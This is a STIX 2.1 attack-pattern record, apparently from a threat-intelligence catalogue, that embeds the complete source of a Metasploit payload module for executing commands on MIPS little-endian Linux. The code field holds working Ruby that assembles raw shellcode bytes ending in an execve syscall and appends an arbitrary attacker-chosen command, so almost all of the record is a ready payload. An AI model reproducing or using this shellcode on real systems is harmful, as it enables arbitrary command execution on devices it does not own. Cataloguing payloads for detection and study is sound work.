{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81ce7bc0-2924-4062-819f-188f001e5235",
    "created": "2024-08-14T16:33:19.444054Z",
    "modified": "2024-08-14T16:33:19.444057Z",
    "name": "Linux Execute Command",
    "description": " A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/mipsle/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 52\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Execute Command',\n      'Description'   => %q{\n        A very small shellcode for executing commands.\n        This module is sometimes helpful for testing purposes as well as\n        on targets with extremely limited buffer space.\n         },\n      'Author'        =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload\n          'entropy@phiral.net'  #original payload\n        ],\n      'References'    =>\n        [\n          ['EDB', '17940']\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSLE,\n      'Payload'       =>\n        {\n          'Offsets' => {} ,\n          'Payload' => ''\n        })\n    )\n    register_options(\n      [\n        OptString.new('CMD', [ true, \"The command string to execute\" ]),\n      ])\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    return datastore['CMD'] || ''\n  end\n\n  def generate(_opts = {})\n\n    shellcode =\n      \"\\x66\\x06\\x06\\x24\" + # li a2,1638\n      \"\\xff\\xff\\xd0\\x04\" + # bltzal a2,4100b4\n      \"\\xff\\xff\\x06\\x28\" + # slti a2,zero,-1\n      \"\\xe0\\xff\\xbd\\x27\" + # addiu sp,sp,-32\n      \"\\x01\\x10\\xe4\\x27\" + # addiu a0,ra,4097\n      \"\\x1f\\xf0\\x84\\x24\" + # addiu a0,a0,-4065\n      \"\\xe8\\xff\\xa4\\xaf\" + # sw a0,-24(sp)\n      \"\\xec\\xff\\xa0\\xaf\" + # sw zero,-20(sp)\n      \"\\xe8\\xff\\xa5\\x27\" + # addiu a1,sp,-24\n      \"\\xab\\x0f\\x02\\x24\" + # li v0,4011\n      \"\\x0c\\x01\\x01\\x01\"   # syscall 0x40404\n\n    #\n    # Constructs the payload\n    #\n\n    shellcode = shellcode + command_string + \"\\x00\"\n\n    # we need to align our shellcode to 4 bytes\n    (shellcode = shellcode + \"\\x00\") while shellcode.length%4 != 0\n\n    return super + shellcode\n\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}